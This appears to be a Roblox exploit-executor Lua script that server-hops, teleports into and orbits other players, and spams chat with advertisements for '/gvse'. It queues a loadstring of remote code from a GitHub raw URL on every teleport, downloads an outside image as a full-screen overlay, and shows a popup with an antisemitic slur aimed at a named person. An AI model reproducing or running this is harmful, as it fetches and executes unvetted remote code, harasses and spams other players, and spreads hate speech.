-- FPS Capper & Teleport Automation Script with Custom Asset Screen Overlay & Chat Service
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local TARGET_FPS = 15

-- Forceful 15 FPS Capper Runner
task.spawn(function()
    while true do
        local t0 = tick()
        RunService.RenderStepped:Wait()
        repeat until (t0 + 1 / TARGET_FPS) < tick()
    end
end)

local function missing(expectedType, value, fallback)
    if type(value) == expectedType then
        return value
    end
    return fallback
end

-- Bulletproof queue_on_teleport function resolver
local queueteleport = queue_on_teleport 
    or (syn and syn.queue_on_teleport) 
    or (fluxus and fluxus.queue_on_teleport) 
    or queueonteleport 
    or (identifyexecutor and select(1, identifyexecutor()) == "Delta" and nil)

if type(_G.KeepInfYield) ~= "boolean" then
    _G.KeepInfYield = true
end

if type(_G.TeleportState) ~= "table" then
    _G.TeleportState = {
        TeleportCheck = false,
        TeleportRetries = 0,
        MaxRetries = 5,
        ServerHopTimer = false,
        ScriptFinished = false,
        IsRunning = false
    }
end

local SCRIPT_URL = "https://raw.githubusercontent.com/Hawnzs/gv/main/script.lua"

-- Universal function to set queue on teleport prior to hopping
local function safeQueueTeleport()
    if queueteleport then
        pcall(function()
            queueteleport(string.format([[
                task.wait(1)
                pcall(function()
                    loadstring(game:HttpGet("%s", true))()
                end)
            ]], SCRIPT_URL))
        end)
    end
end

game.Players.LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.InProgress then
        if _G.KeepInfYield and not _G.TeleportState.TeleportCheck then
            _G.TeleportState.TeleportCheck = true
            safeQueueTeleport()
        end
    elseif State == Enum.TeleportState.Failed then
        _G.TeleportState.TeleportCheck = false
        _G.TeleportState.IsRunning = false
    end
end)

local v_QpZ = game:GetService("Players")
local v_Lmk = game:GetService("RunService")
local v_Wne = game:GetService("ReplicatedStorage")
local v_Rtd = game:GetService("TextChatService")
local v_Tps = game:GetService("TeleportService")
local v_Hts = game:GetService("HttpService")
local v_Gui = game:GetService("GuiService")
local v_Sgi = game:GetService("StarterGui")
local plr = v_QpZ.LocalPlayer

-- DOWNLOAD IMAGE & LOAD VIA GETCUSTOMASSET
local function getOverlayAsset()
    local fileName = "overlay_bg_image.jpg"
    local imageUrl = "https://ic.c4assets.com/vps/1000-men-and-me-the-bonnie-blue-story/8A7A37FF-1CFF-4D18-89DAB4BB0A3E3AD4.jpg"
    
    local customAssetFunc = getcustomasset or (syn and syn.getcustomasset) or (fluxus and fluxus.getcustomasset)
    
    if not isfile or not writefile or not customAssetFunc then
        return nil
    end

    pcall(function()
        if not isfile(fileName) then
            local imageData = game:HttpGet(imageUrl)
            writefile(fileName, imageData)
        end
    end)

    local success, assetId = pcall(function()
        return customAssetFunc(fileName)
    end)

    if success then
        return assetId
    end
    return nil
end

-- FULLSCREEN 15% OPACITY OVERLAY GUI
task.spawn(function()
    pcall(function()
        local playerGui = plr:WaitForChild("PlayerGui", 10)
        if not playerGui then return end

        local assetId = getOverlayAsset()
        if not assetId then return end

        local existingGui = playerGui:FindFirstChild("FullScreenOverlayGui")
        if existingGui then existingGui:Destroy() end

        local overlayGui = Instance.new("ScreenGui")
        overlayGui.Name = "FullScreenOverlayGui"
        overlayGui.IgnoreGuiInset = true
        overlayGui.ResetOnSpawn = false
        overlayGui.DisplayOrder = 99998
        overlayGui.Parent = playerGui

        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Name = "OverlayImage"
        imageLabel.Size = UDim2.new(1, 0, 1, 0)
        imageLabel.Position = UDim2.new(0, 0, 0, 0)
        imageLabel.BackgroundTransparency = 1
        imageLabel.Image = assetId
        imageLabel.ImageTransparency = 0.85 -- 15% Opacity
        imageLabel.ScaleType = Enum.ScaleType.Stretch
        imageLabel.Parent = overlayGui
    end)
end)

-- COOL FONT INTRO POPUP GUI
task.spawn(function()
    pcall(function()
        local playerGui = plr:WaitForChild("PlayerGui", 10)
        if not playerGui then return end

        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "IntroPopupGui"
        screenGui.IgnoreGuiInset = true
        screenGui.DisplayOrder = 99999
        screenGui.Parent = playerGui

        local textLabel = Instance.new("TextLabel")
        textLabel.Name = "IntroText"
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.Position = UDim2.new(0, 0, 0, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = "Dishy Is A Jew"
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
        textLabel.TextStrokeTransparency = 0.2
        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        textLabel.Parent = screenGui

        task.wait(5)
        
        local tweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = tweenService:Create(textLabel, tweenInfo, {TextTransparency = 1, TextStrokeTransparency = 1})
        tween:Play()
        tween.Completed:Connect(function()
            screenGui:Destroy()
        end)
    end)
end)

-- ULTRA AGGRESSIVE CHAT UI RESTORATION
task.spawn(function()
    while task.wait(1) do
        pcall(function()
            v_Sgi:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
            v_Sgi:SetCore("ChatWindowVisible", true)
            v_Sgi:SetCore("ChatActive", true)
            
            local playerGui = plr:FindFirstChild("PlayerGui")
            if playerGui then
                local chatGui = playerGui:FindFirstChild("Chat")
                if chatGui then
                    chatGui.Enabled = true
                    for _, child in ipairs(chatGui:GetDescendants()) do
                        if child:IsA("Frame") or child:IsA("ScrollingFrame") or child:IsA("TextBox") then
                            child.Visible = true
                        end
                    end
                end
            end
            
            if v_Rtd.ChatVersion == Enum.ChatVersion.TextChatService then
                local windowConfig = v_Rtd:FindFirstChild("ChatWindowConfiguration")
                if windowConfig then
                    windowConfig.Enabled = true
                end
            end
        end)
    end
end)

-- ANTI-SIT & ANTI-RAGDOLL SYSTEM
local function setupAntiStates(char)
    if not char then return end
    
    local humanoid = char:WaitForChild("Humanoid", 5)
    if humanoid then
        humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
            if humanoid.Sit then
                humanoid.Sit = false
            end
        end)
        
        humanoid.StateChanged:Connect(function(_, newState)
            if newState == Enum.HumanoidStateType.Seated then
                humanoid.Sit = false
                humanoid:ChangeState(Enum.HumanoidStateType.Running)
            elseif newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown then
                humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
    end

    char.DescendantAdded:Connect(function(descendant)
        pcall(function()
            if descendant:IsA("BallSocketConstraint") or descendant:IsA("HingeConstraint") or descendant:IsA("BodyVelocity") or descendant:IsA("BodyAngularVelocity") then
                if descendant.Name:lower():find("ragdoll") or descendant.Name:lower():find("joint") then
                    descendant:Destroy()
                end
            end
        end)
    end)
end

plr.CharacterAdded:Connect(setupAntiStates)
if plr.Character then
    task.spawn(function() setupAntiStates(plr.Character) end)
end

local function httpRequest(url)
    local success, result
    success, result = pcall(function() return game:HttpGet(url) end)
    if success and type(result) == "string" and #result > 0 then return result end

    success, result = pcall(function()
        local response = syn.request({Url = url, Method = "GET"})
        return response.Body
    end)
    if success and type(result) == "string" and #result > 0 then return result end

    for _, funcName in ipairs({"http_request", "request", "http.request"}) do
        local func = (syn and syn[funcName]) or http_request or request or (http and http.request)
        if func then
            success, result = pcall(function()
                return func({Url = url, Method = "GET"}).Body
            end)
            if success and type(result) == "string" and #result > 0 then return result end
        end
    end
    return nil
end

if _G.TeleportState.IsRunning then
    print("Script already running, waiting...")
    local waitStart = tick()
    repeat 
        task.wait(1) 
    until not _G.TeleportState.IsRunning or (tick() - waitStart > 10)
end
_G.TeleportState.IsRunning = true

while not plr do task.wait(0.1); plr = v_QpZ.LocalPlayer end

task.wait(2)

local title = plr:FindFirstChild("PlayerGui") and plr.PlayerGui:FindFirstChild("Title")
if title then title:Destroy() end

local remote = v_Wne:FindFirstChild("Remote")
if remote then
    local spawnChar = remote:FindFirstChild("SpawnChar")
    if spawnChar then spawnChar:FireServer() end
end

if workspace.CurrentCamera then workspace.CurrentCamera:Destroy() end
task.wait(0.1)

local attempts = 0
repeat 
    task.wait(0.5)
    attempts = attempts + 1
    if attempts > 20 then
        print("Timeout waiting for character - retrying")
        plr.CharacterAdded:Wait()
        attempts = 0
    end
until plr.Character and plr.Character:FindFirstChildWhichIsA("Humanoid")

if not plr.Character then
    plr.CharacterAdded:Wait()
end

local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
if humanoid then
    workspace.CurrentCamera.CameraSubject = humanoid
    workspace.CurrentCamera.CameraType = "Custom"
end
plr.CameraMinZoomDistance = 0.5
plr.CameraMaxZoomDistance = 400
plr.CameraMode = "Classic"

local head = plr.Character:FindFirstChild("Head")
if head then head.Anchored = false end

local n_Gxb = 120
local n_Vcs = 0.06
local n_Iuw = 40
local n_Ptl = 5
local n_Zmq2 = 50
local n_Tmo = 60

local id_Plc = game.PlaceId
local id_Job = game.JobId

if type(_G.t_Fjd) ~= "table" then 
    _G.t_Fjd = {
        "/gvse",
        "broke? /gvse",
        "slow cars? /gvse",
        "want to larp? /gvse",
    }
end
local t_Fjd = _G.t_Fjd

local b_Oek = v_Rtd.ChatVersion == Enum.ChatVersion.LegacyChatService

local function f_Nra(s_Yui)
    s_Yui = tostring(s_Yui)
    if not b_Oek then
        v_Rtd.TextChannels.RBXGeneral:SendAsync(s_Yui)
    else
        v_Wne.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(s_Yui, "All")
    end
end

-- ENHANCED SERVER HOPPER WITH FAILSAFE FALLBACKS
local function f_Sho()
    safeQueueTeleport()
    
    local s_Req = httpRequest("https://games.roblox.com/v1/games/" .. id_Plc .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
    if s_Req then 
        local ok_Bod, t_Bod = pcall(function() return v_Hts:JSONDecode(s_Req) end)
        if ok_Bod and t_Bod and t_Bod.data then 
            local t_Srv = {}
            for _, v_Ent in ipairs(t_Bod.data) do
                if type(v_Ent) == "table"
                    and tonumber(v_Ent.playing)
                    and tonumber(v_Ent.maxPlayers)
                    and v_Ent.playing < v_Ent.maxPlayers
                    and v_Ent.id ~= id_Job then
                    table.insert(t_Srv, v_Ent.id)
                end
            end

            if #t_Srv > 0 then
                _G.TeleportState.ServerHopTimer = true
                _G.TeleportState.ScriptFinished = true
                _G.TeleportState.IsRunning = false
                
                local randomServer = t_Srv[math.random(1, #t_Srv)]
                local tpSuccess = pcall(function()
                    v_Tps:TeleportToPlaceInstance(id_Plc, randomServer, plr)
                end)
                
                if tpSuccess then return true end
            end
        end
    end

    _G.TeleportState.ServerHopTimer = true
    _G.TeleportState.ScriptFinished = true
    _G.TeleportState.IsRunning = false
    pcall(function()
        v_Tps:Teleport(id_Plc, plr)
    end)
    return true
end

local function f_ForceHop()
    if not _G.TeleportState.ServerHopTimer and not _G.TeleportState.ScriptFinished then
        print("Script finished - forcing server hop!")
        _G.TeleportState.ScriptFinished = true
        _G.TeleportState.ServerHopTimer = true
        _G.TeleportState.IsRunning = false
        f_Sho()
    end
end

task.spawn(function()
    task.wait(180)
    if not _G.TeleportState.ServerHopTimer and not _G.TeleportState.ScriptFinished then
        print("180 seconds passed - forcing server hop!")
        _G.TeleportState.ServerHopTimer = true
        _G.TeleportState.ScriptFinished = true
        _G.TeleportState.IsRunning = false
        f_Sho()
    end
end)

v_Tps.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    _G.TeleportState.TeleportRetries = _G.TeleportState.TeleportRetries + 1
    task.wait(2)
    f_Sho()
end)

v_Gui.ErrorMessageChanged:Connect(function(message)
    if message and #message > 0 then
        _G.TeleportState.TeleportRetries = _G.TeleportState.TeleportRetries + 1
        task.wait(2)
        f_Sho()
    end
end)

local function f_Hbv(p) return p.Character and p.Character:FindFirstChild("HumanoidRootPart") end
local function f_Lzt() return f_Hbv(plr) end

local function f_Mqe(pos)
    local hrp = f_Lzt()
    if not hrp then return end
    pcall(function()
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = CFrame.new(pos)
    end)
    task.wait(n_Vcs)
end

local function f_Dvi()
    local t_Sog = {Vector2.new(0,0)}
    for i = 1, n_Iuw do
        local x,z = -i, -i
        for _=1,2*i do z=z+1; table.insert(t_Sog, Vector2.new(x,z)) end
        for _=1,2*i do x=x+1; table.insert(t_Sog, Vector2.new(x,z)) end
        for _=1,2*i do z=z-1; table.insert(t_Sog, Vector2.new(x,z)) end
        for _=1,2*i do x=x-1; table.insert(t_Sog, Vector2.new(x,z)) end
    end
    return t_Sog
end

-- DYNAMIC PING MEASUREMENT FOR LATENCY LEAD CALCULATION
local function getPingInSeconds()
    local ping = 0.1
    pcall(function()
        local dataPing = Stats.Network.ServerStatsItem["Data Ping"]
        if dataPing then
            ping = (dataPing:GetValue() / 1000)
        end
    end)
    return math.clamp(ping, 0.05, 0.5)
end

-- ADVANCED DESYNC / DYNAMIC VEHICLE & WALKING PREDICTION ORBIT HOOK
local SPEED_THRESHOLD = 16 -- Normal walking speed threshold in studs/sec

local function f_Wpy(target, duration)
    local elapsed, angle = 0, 0
    while elapsed < duration do
        local dt = v_Lmk.Heartbeat:Wait()
        elapsed = elapsed + dt
        angle = angle + 4 * dt

        if not target or not target.Parent then break end

        local myHrp = f_Lzt()
        local tgtHrp = f_Hbv(target)

        if myHrp and tgtHrp then
            pcall(function()
                local targetAssembly = tgtHrp.AssemblyRootPart or tgtHrp
                local targetVel = targetAssembly.AssemblyLinearVelocity
                local targetSpeed = targetVel.Magnitude

                local predictedPos = targetAssembly.Position
                local leadFrontOffset = Vector3.zero

                -- Only compensate if moving faster than standard walking speed (16 studs/sec)
                if targetSpeed > SPEED_THRESHOLD then
                    local pingSec = getPingInSeconds()
                    local leadTime = (pingSec * 1.8) + 0.15 
                    
                    predictedPos = targetAssembly.Position + (targetVel * leadTime)

                    local moveDir = targetVel.Unit
                    leadFrontOffset = moveDir * math.clamp(targetSpeed * 0.25, 3, 15)
                end

                myHrp.AssemblyLinearVelocity = Vector3.zero
                myHrp.AssemblyAngularVelocity = Vector3.zero

                local orbitRadius = 6
                local orbitOffset = Vector3.new(math.cos(angle) * orbitRadius, 1, math.sin(angle) * orbitRadius)

                local finalTargetCFrame = CFrame.new(predictedPos + leadFrontOffset + orbitOffset, predictedPos)
                myHrp.CFrame = finalTargetCFrame
            end)
        else
            break
        end
    end
end

local function f_Kxs(visited)
    local t = {}
    for _, p in ipairs(v_QpZ:GetPlayers()) do
        if p ~= plr and not visited[p] and f_Hbv(p) then
            table.insert(t, p)
        end
    end
    return t
end

local function f_Ryn()
    local hrp = f_Lzt()
    if not hrp then
        print("Waiting for HumanoidRootPart...")
        repeat 
            task.wait(0.5)
            hrp = f_Lzt()
        until hrp
    end
    
    local startHrp = hrp
    if not startHrp then return end
    
    local origin = startHrp.Position
    local total = #v_QpZ:GetPlayers() - 1
    local visited = {}
    local chattedPlayers = {}
    local found = 0
    local lastFound = os.clock()

    for _, p in ipairs(f_Kxs(visited)) do
        visited[p] = true; found = found + 1
        
        if not chattedPlayers[p] then
            chattedPlayers[p] = true
            if t_Fjd and #t_Fjd > 0 then f_Nra(t_Fjd[math.random(#t_Fjd)]) end
        end

        f_Wpy(p, n_Ptl)
        lastFound = os.clock()
    end
    if found >= total then 
        f_ForceHop()
        return 
    end

    while found < total do
        local spiral = f_Dvi()
        local breakOuter = false

        for _, cell in ipairs(spiral) do
            if found >= total then 
                breakOuter = true
                f_ForceHop()
                break 
            end

            if os.clock() - lastFound >= n_Tmo then
                if f_Sho() then 
                    return 
                end
                lastFound = os.clock()
                break
            end

            local pos = origin + Vector3.new(cell.X * n_Gxb, n_Zmq2, cell.Y * n_Gxb)
            f_Mqe(pos)

            for _, p in ipairs(f_Kxs(visited)) do
                visited[p] = true; found = found + 1
                
                if not chattedPlayers[p] then
                    chattedPlayers[p] = true
                    if t_Fjd and #t_Fjd > 0 then f_Nra(t_Fjd[math.random(#t_Fjd)]) end
                end

                f_Wpy(p, n_Ptl)
                lastFound = os.clock()
                local curHrp = f_Lzt()
                if curHrp then origin = curHrp.Position end
                if found >= total then 
                    breakOuter = true
                    f_ForceHop()
                    break 
                end
            end
            if breakOuter then break end
        end
        if breakOuter then break end
    end
    
    f_ForceHop()
end

local success, err = pcall(function()
    if not (plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")) then
        print("Waiting for character...")
        plr.CharacterAdded:Wait()
        repeat 
            task.wait(0.1) 
        until plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        task.wait(1)
    end
    
    f_Ryn()
end)

if not success then
    print("Script error: " .. tostring(err))
    task.wait(2)
    f_ForceHop()
end

_G.TeleportState.IsRunning = false
